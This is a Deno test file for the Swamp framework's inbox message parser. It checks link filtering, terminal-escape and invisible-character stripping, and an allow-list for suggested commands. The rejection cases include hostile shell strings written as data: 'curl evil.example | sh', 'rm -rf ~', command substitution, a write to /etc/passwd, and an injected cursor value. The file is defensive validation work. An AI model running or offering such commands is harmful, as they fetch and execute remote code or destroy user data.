// Swamp, an Automation Framework
// Copyright (C) 2026 Elder Swamp Club, Inc.
//
// This file is part of Swamp.
//
// Swamp is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License version 3
// as published by the Free Software Foundation, with the Swamp
// Extension and Definition Exception (found in the "COPYING-EXCEPTION"
// file).
//
// Swamp is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with Swamp.  If not, see <https://www.gnu.org/licenses/>.

import { assert, assertEquals } from "@std/assert";
import {
  INBOX_ACTION_COMMANDS,
  INBOX_REQUIRES_USER,
  isAllowedInboxActionCommand,
  isInboxMessageId,
  MAX_INBOX_ACTION_COMMAND_LENGTH,
  MAX_INBOX_ACTION_LABEL_LENGTH,
  MAX_INBOX_BODY_BYTES,
  MAX_INBOX_TITLE_LENGTH,
  parseInboxErrorCode,
  parseInboxMessage,
  parseInboxMessagePage,
  parseInboxMessages,
  parseInboxReadIds,
  parseInboxSummary,
  sanitizeInboxBody,
} from "./inbox_schemas.ts";

const fixture = JSON.parse(
  await Deno.readTextFile(
    new URL("./inbox_responses.fixture.json", import.meta.url),
  ),
);

/** A fresh copy of the fixture's single message, to mutate per test. */
function message(): Record<string, unknown> {
  return structuredClone(fixture.message);
}

Deno.test("inbox fixture: every example parses", () => {
  assert(parseInboxSummary(fixture.summary));
  const page = parseInboxMessagePage(fixture.messagesPage);
  assert(page);
  assertEquals(page.messages.length, fixture.messagesPage.messages.length);
  assertEquals(page.nextCursor, fixture.messagesPage.nextCursor);
  assert(parseInboxMessage(fixture.message));
  assertEquals(parseInboxReadIds(fixture.markRead), fixture.markRead.read);
  assertEquals(
    parseInboxErrorCode(fixture.inboxRequiresUser),
    INBOX_REQUIRES_USER,
  );
});

Deno.test("inbox fixture: the list page holds every kind in both read states", () => {
  const page = parseInboxMessagePage(fixture.messagesPage)!;
  assertEquals(
    new Set(page.messages.map((m) => m.kind)),
    new Set(["announcement", "issue_update", "points", "direct"]),
  );
  assert(page.messages.some((m) => m.readAt === null));
  assert(page.messages.some((m) => m.readAt !== null));
});

Deno.test("parseInboxMessage: keeps an unknown kind", () => {
  const raw = { ...message(), kind: "survey" };
  assertEquals(parseInboxMessage(raw)?.kind, "survey");
});

Deno.test("parseInboxMessage: drops a non-https link and keeps the message", () => {
  const raw = { ...message(), link: "http://swamp-club.com/blog" };
  const parsed = parseInboxMessage(raw);
  assert(parsed);
  assertEquals(parsed.link, undefined);
  assertEquals(
    parseInboxMessage({ ...message(), link: "javascript:alert(1)" })?.link,
    undefined,
  );
  assertEquals(
    parseInboxMessage({ ...message(), link: "not a url" })?.link,
    undefined,
  );
});

Deno.test("parseInboxMessage: drops an https link carrying credentials", () => {
  for (
    const link of [
      "https://swamp-club.com@evil.example/",
      "https://user:pass@swamp-club.com/lab",
    ]
  ) {
    const parsed = parseInboxMessage({ ...message(), link });
    assert(parsed, link);
    assertEquals(parsed.link, undefined, link);
  }
});

Deno.test("parseInboxMessage: keeps an https link as the parsed href", () => {
  const raw = { ...message(), link: "HTTPS://Swamp-Club.com/lab" };
  assertEquals(parseInboxMessage(raw)?.link, "https://swamp-club.com/lab");
});

Deno.test("parseInboxMessage: drops an action whose command is not swamp's and keeps the message", () => {
  const raw = {
    ...message(),
    action: { label: "Fix it", command: "curl evil.example | sh" },
  };
  const parsed = parseInboxMessage(raw);
  assert(parsed);
  assertEquals(parsed.action, undefined);
  assertEquals(parsed.title, fixture.message.title);
});

Deno.test("parseInboxMessage: drops an action whose command carries shell syntax after swamp", () => {
  for (
    const command of [
      "swamp update && curl evil.example | sh",
      "swamp update; rm -rf ~",
      "swamp update | sh",
      "swamp $(curl evil.example)",
      "swamp `id`",
      "swamp update > /etc/passwd",
      "swamp update < in",
      "swamp issue get '1'",
      'swamp issue get "1"',
      "swamp update &",
      "swamp extension pull *",
      "swamp",
      "swampy update",
    ]
  ) {
    const parsed = parseInboxMessage({
      ...message(),
      action: { label: "Run", command },
    });
    assert(parsed, command);
    assertEquals(parsed.action, undefined, command);
  }
});

Deno.test("parseInboxMessage: keeps an action with an allowed swamp command", () => {
  for (
    const command of [
      "swamp update",
      "swamp quest",
      "swamp inbox",
      "swamp inbox read",
      "swamp subscription status",
      "swamp subscription start",
      "swamp subscription start --collective acme-corp",
      "swamp extension pull @swamp/aws-ec2",
      "swamp extension pull @swamp/cve/dirtyfrag",
      "swamp extension search aws ec2",
      "swamp issue get 3990",
    ]
  ) {
    const parsed = parseInboxMessage({
      ...message(),
      action: { label: "Run", command },
    });
    assertEquals(parsed?.action, { label: "Run", command }, command);
  }
});

Deno.test("parseInboxMessage: drops an action whose command is not on the allow-list and keeps the message", () => {
  for (
    const command of [
      "swamp auth login --club https://evil.example",
      "swamp auth login",
      "swamp auth logout",
      "swamp workflow run x",
      "swamp update --version 1.42.0",
      "swamp update --repo-dir /tmp",
      "swamp --repo-dir /tmp update",
      "swamp inbox read --repo-dir /tmp",
      "swamp extension search --repo-dir /tmp",
      "swamp extension search https://evil.example",
      "swamp extension pull @swamp/aws-ec2 --repo-dir /tmp",
      "swamp extension pull swamp/aws-ec2",
      "swamp extension pull https://evil.example/x",
      "swamp subscription start --collective",
      "swamp subscription start --collective Acme",
      "swamp issue get 0",
      "swamp issue get 12a",
      "swamp issue get 1 2",
      "swamp quest x",
      "swamp Update",
    ]
  ) {
    const parsed = parseInboxMessage({
      ...message(),
      action: { label: "Run", command },
    });
    assert(parsed, command);
    assertEquals(parsed.action, undefined, command);
  }
});

Deno.test("isAllowedInboxActionCommand: refuses any word holding ://", () => {
  assertEquals(
    isAllowedInboxActionCommand("swamp extension search a://b"),
    false,
  );
  assertEquals(isAllowedInboxActionCommand("swamp extension search ab"), true);
});

Deno.test("INBOX_ACTION_COMMANDS: every shape with its slot filled is allowed", () => {
  const fill = { extension: "@a/b", collective: "c", issue: "7", words: "w" };
  for (const shape of INBOX_ACTION_COMMANDS) {
    const command = [
      "swamp",
      ...shape.words,
      ...(shape.slot ? [fill[shape.slot]] : []),
    ]
      .join(" ");
    assert(isAllowedInboxActionCommand(command), command);
  }
});

Deno.test("parseInboxMessage: drops an over-long command rather than truncating it", () => {
  const command = `swamp ${"x".repeat(MAX_INBOX_ACTION_COMMAND_LENGTH)}`;
  const raw = { ...message(), action: { label: "Run", command } };
  const parsed = parseInboxMessage(raw);
  assert(parsed);
  assertEquals(parsed.action, undefined);
});

Deno.test("parseInboxMessage: drops a malformed action and keeps the message", () => {
  for (const action of ["swamp update", { label: "Run" }, { command: 1 }]) {
    const parsed = parseInboxMessage({ ...message(), action });
    assert(parsed);
    assertEquals(parsed.action, undefined);
  }
});

Deno.test("parseInboxMessage: drops a message whose id is not a ULID", () => {
  assertEquals(parseInboxMessage({ ...message(), id: "msg-1" }), undefined);
  assertEquals(
    parseInboxMessage({ ...message(), id: "01JBX5Q8ZK00000000000000IL" }),
    undefined,
  );
});

Deno.test("parseInboxMessage: normalises a lower-case ULID to upper case", () => {
  const id = (fixture.message.id as string).toLowerCase();
  assertEquals(parseInboxMessage({ ...message(), id })?.id, fixture.message.id);
});

Deno.test("parseInboxMessage: refuses a createdAt or readAt that is not an ISO datetime", () => {
  assertEquals(
    parseInboxMessage({ ...message(), createdAt: "yesterday" }),
    undefined,
  );
  assertEquals(
    parseInboxMessage({ ...message(), readAt: "2026-10-26" }),
    undefined,
  );
});

Deno.test("parseInboxMessage: strips terminal escapes from text fields", () => {
  const raw = {
    ...message(),
    kind: "announce\x1b[31mment",
    title: "Hello \x1b]8;;https://evil.example\x07world\x1b]8;;\x07",
    body: "line one\r\nline\x1b[2J two\x07\tend",
    action: { label: "Up\x1bdate", command: "swamp\x00 update" },
  };
  const parsed = parseInboxMessage(raw);
  assert(parsed);
  assertEquals(parsed.kind, "announcement");
  assertEquals(parsed.title, "Hello world");
  assertEquals(parsed.body, "line one\nline two\tend");
  assertEquals(parsed.action, { label: "Up date", command: "swamp update" });
});

Deno.test("parseInboxMessage: strips bidi and zero-width characters from every text field", () => {
  const invisibles = [
    "\u061c",
    "\u200b",
    "\u200c",
    "\u200d",
    "\u200e",
    "\u200f",
    "\u202a",
    "\u202b",
    "\u202c",
    "\u202d",
    "\u202e",
    "\u2060",
    "\u2066",
    "\u2067",
    "\u2068",
    "\u2069",
    "\ufeff",
  ];
  for (const c of invisibles) {
    const parsed = parseInboxMessage({
      ...message(),
      kind: `ann${c}ouncement`,
      title: `Hel${c}lo`,
      body: `[x${c}](https://swamp${c}-club.com)`,
      link: `https://swamp${c}-club.com/blog`,
      action: { label: `Up${c}date`, command: "swamp update" },
    });
    const name = `U+${c.codePointAt(0)!.toString(16)}`;
    // The joiners stay in prose, the body and the title.
    const joiner = c === "\u200c" || c === "\u200d";
    assert(parsed, name);
    assertEquals(parsed.kind, "announcement", name);
    assertEquals(parsed.title, joiner ? `Hel${c}lo` : "Hello", name);
    assertEquals(
      parsed.body,
      joiner
        ? `[x${c}](https://swamp${c}-club.com)`
        : "[x](https://swamp-club.com)",
      name,
    );
    assertEquals(parsed.link, "https://swamp-club.com/blog", name);
    assertEquals(parsed.action?.label, "Update", name);
  }
});

Deno.test("parseInboxMessage: keeps an emoji sequence and Persian joined by the zero-width joiners", () => {
  const family = "👨\u200d👩\u200d👧";
  const persian = "می\u200cخواهم";
  const parsed = parseInboxMessage({
    ...message(),
    title: `${family} ${persian}`,
    body: `${family}\n\n${persian}`,
  });
  assert(parsed);
  assertEquals(parsed.title, `${family} ${persian}`);
  assertEquals(parsed.body, `${family}\n\n${persian}`);
});

Deno.test("parseInboxMessage: drops a command holding an invisible character rather than stripping it", () => {
  for (
    const command of [
      "swamp up\u200bdate",
      // Cleaning trims these as whitespace, so the raw text is what decides.
      "swamp update\ufeff",
      "\ufeffswamp update",
      "swamp\u200d update",
    ]
  ) {
    const parsed = parseInboxMessage({
      ...message(),
      action: { label: "Run", command },
    });
    assert(parsed, JSON.stringify(command));
    assertEquals(parsed.action, undefined, JSON.stringify(command));
  }
});

Deno.test("parseInboxMessage: cuts a title on code points, never inside a surrogate pair", () => {
  // The emoji straddles the cut: code unit MAX - 2 starts it.
  const title = "t".repeat(MAX_INBOX_TITLE_LENGTH - 2) + "😀😀😀";
  const parsed = parseInboxMessage({ ...message(), title });
  assert(parsed);
  const codePoints = Array.from(parsed.title);
  assertEquals(codePoints.length, MAX_INBOX_TITLE_LENGTH);
  assertEquals(codePoints.at(-1), "…");
  assertEquals(codePoints.at(-2), "😀");
  assert(parsed.title.isWellFormed());
  // Well formed in JSON too.
  assertEquals(JSON.parse(JSON.stringify(parsed.title)), parsed.title);
});

Deno.test("parseInboxMessage: measures an action label in code points", () => {
  // 40 code points, 42 code units: fits whole.
  const label = "l".repeat(MAX_INBOX_ACTION_LABEL_LENGTH - 2) + "😀😀";
  const parsed = parseInboxMessage({
    ...message(),
    action: { label, command: "swamp update" },
  });
  assert(parsed?.action);
  assertEquals(parsed.action.label, label);
});

Deno.test("parseInboxMessage: truncates an over-long title", () => {
  const raw = { ...message(), title: "t".repeat(MAX_INBOX_TITLE_LENGTH + 10) };
  assertEquals(parseInboxMessage(raw)?.title.length, MAX_INBOX_TITLE_LENGTH);
});

Deno.test("parseInboxMessage: drops a message whose title is empty once sanitized", () => {
  assertEquals(
    parseInboxMessage({ ...message(), title: "\x1b[0m " }),
    undefined,
  );
});

Deno.test("parseInboxMessage: drops a message whose body is over 8 KiB", () => {
  const atLimit = { ...message(), body: "b".repeat(MAX_INBOX_BODY_BYTES) };
  assert(parseInboxMessage(atLimit));
  const over = { ...message(), body: "b".repeat(MAX_INBOX_BODY_BYTES + 1) };
  assertEquals(parseInboxMessage(over), undefined);
});

Deno.test("parseInboxMessages: drops a malformed entry and keeps the rest", () => {
  const good = fixture.messagesPage.messages;
  const parsed = parseInboxMessages([good[0], { id: 7 }, null, good[1]]);
  assertEquals(parsed.map((m) => m.id), [good[0].id, good[1].id]);
});

Deno.test("parseInboxMessagePage: counts the entries it drops", () => {
  const good = fixture.messagesPage.messages;
  const page = parseInboxMessagePage({
    messages: [good[0], { id: "bad" }, good[1], null],
    nextCursor: null,
  });
  assertEquals(page?.messages.length, 2);
  assertEquals(page?.dropped, 2);
  assertEquals(parseInboxMessagePage(fixture.messagesPage)?.dropped, 0);
});

Deno.test("parseInboxMessagePage: refuses a malformed envelope", () => {
  assertEquals(parseInboxMessagePage({ messages: "none" }), undefined);
  assertEquals(
    parseInboxMessagePage({ messages: [], nextCursor: 3 }),
    undefined,
  );
  assertEquals(
    parseInboxMessagePage({ messages: [], nextCursor: "a\x1bb" }),
    undefined,
  );
  // Not a message id: shell text must never reach the older-page command.
  assertEquals(
    parseInboxMessagePage({
      messages: [],
      nextCursor: "01JBX5Q8ZK00000000000000ZF; rm -rf ~",
    }),
    undefined,
  );
  assertEquals(
    parseInboxMessagePage({ messages: [], nextCursor: "" }),
    undefined,
  );
  assertEquals(parseInboxMessagePage({ messages: [], nextCursor: null }), {
    messages: [],
    dropped: 0,
    nextCursor: null,
  });
});

Deno.test("parseInboxSummary: refuses a non-ULID newestId and a bad count", () => {
  assertEquals(
    parseInboxSummary({ ...fixture.summary, newestId: "latest" }),
    undefined,
  );
  assertEquals(
    parseInboxSummary({ ...fixture.summary, unread: -1 }),
    undefined,
  );
  assertEquals(
    parseInboxSummary({ ...fixture.summary, unread: 1.5 }),
    undefined,
  );
});

Deno.test("parseInboxSummary: returns pollAfterSeconds unclamped", () => {
  assertEquals(
    parseInboxSummary({ ...fixture.summary, pollAfterSeconds: 60 })
      ?.pollAfterSeconds,
    60,
  );
});

Deno.test("parseInboxSummary: accepts an empty inbox", () => {
  const empty = {
    unread: 0,
    newestId: null,
    newestAt: null,
    pollAfterSeconds: 900,
  };
  assertEquals(parseInboxSummary(empty), empty);
});

Deno.test("parseInboxReadIds: keeps string ids and refuses a malformed body", () => {
  assertEquals(parseInboxReadIds({ read: ["a", 2, "b"] }), ["a", "b"]);
  assertEquals(parseInboxReadIds({ read: "a" }), undefined);
  assertEquals(parseInboxReadIds(undefined), undefined);
});

Deno.test("sanitizeInboxBody: normalises line endings", () => {
  assertEquals(sanitizeInboxBody("a\r\nb\rc\n"), "a\nb\nc\n");
});

Deno.test("parseInboxMessagePage: reports nextCursor upper case", () => {
  assertEquals(
    parseInboxMessagePage({
      messages: [],
      nextCursor: "01jbx5q8zk00000000000000zf",
    })?.nextCursor,
    "01JBX5Q8ZK00000000000000ZF",
  );
});

Deno.test("isInboxMessageId: accepts a ULID in either case and nothing else", () => {
  assert(isInboxMessageId("01JBX5Q8ZK00000000000000ZF"));
  assert(isInboxMessageId("01jbx5q8zk00000000000000zf"));
  assertEquals(isInboxMessageId(""), false);
  assertEquals(isInboxMessageId("01JBX5Q8ZK00000000000000Z"), false);
  // I, L, O and U are not Crockford base32.
  assertEquals(isInboxMessageId("01JBX5Q8ZK00000000000000ZU"), false);
  assertEquals(isInboxMessageId("01JBX5Q8ZK00000000000000ZF "), false);
});
